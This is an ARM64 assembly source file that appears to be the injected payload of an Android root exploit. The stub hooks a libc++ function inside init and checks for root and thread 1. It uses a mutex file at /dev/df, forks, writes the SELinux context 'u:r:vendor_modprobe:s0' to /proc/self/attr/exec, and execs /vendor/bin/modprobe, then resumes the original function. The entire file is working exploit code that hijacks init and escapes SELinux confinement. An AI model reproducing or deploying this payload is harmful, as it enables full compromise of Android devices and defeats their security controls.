    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_filename
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

libcxx_filename:
L_filename:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/modprobe"

    .balign 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0

    cbnz    w0, return

    // Detect init tid = 1
    // We need in thread 1 to use default ns
    mov     x8, SYS_gettid
    svc     0

    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    /* call openat(0, filename, O_CREAT|O_EXCL, 0) */
    mov     x0, -100
    // Must pass L_filename. If put libcxx_filename, address is not determined until link time.
    adr     x1, L_filename
    // O_CREAT|O_EXCL|O_CLOEXEC
    movl     x2, 524480
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id

    add     sp, sp, 16

    // returned tid on parent, zero on child
    cbnz    w0, return

    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    // O_WRONLY|O_CLOEXEC
    movl    x2, 524289
    mov     x8, #SYS_openat
    svc     0
    // x0 = fd
    // write selinux_ctx
    adr x1, selinux_ctx
    mov x2, selinux_ctx_end - selinux_ctx
    mov x8, #SYS_write
    svc 0
    // execute

    adr     x0, exe_path
    sub sp, sp, 16
    adr x1,exe_path
    str x1,[sp]
    str xzr,[sp,8]
    mov x1,sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0


my_loop:
    b my_loop

return:

    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

    // First instruction of original function.
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    // Back to original
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
